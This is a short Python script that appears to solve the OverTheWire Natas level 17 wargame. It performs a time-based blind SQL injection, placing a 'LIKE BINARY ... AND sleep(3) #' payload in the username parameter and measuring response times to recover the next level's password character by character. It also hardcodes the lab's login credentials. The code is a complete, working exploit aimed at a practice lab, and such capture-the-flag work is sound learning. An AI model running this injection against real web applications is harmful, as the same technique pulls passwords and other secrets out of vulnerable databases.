import requests
from requests.auth import HTTPBasicAuth
import string
import time

url = 'http://natas17.natas.labs.overthewire.org'
auth = HTTPBasicAuth("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

crib = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"

allowed = string.ascii_letters + string.digits

with requests.Session() as sesh:
	while True:
		happened = False
		for c in allowed:		
			like = crib + c

			params = {
				"debug": "true",
				# only sleeps if LIKE BINARY hits true
				"username": f'natas18" AND password LIKE BINARY "{like}%" AND sleep(3) #'
			}

			start = time.time()
			resp = sesh.get(url, params=params, auth=auth)
			end = time.time()
			
			print(like, end-start)
			
			if end-start > 3:
				happened = True
				crib += c
				break
				
		if not happened: break

print(crib)
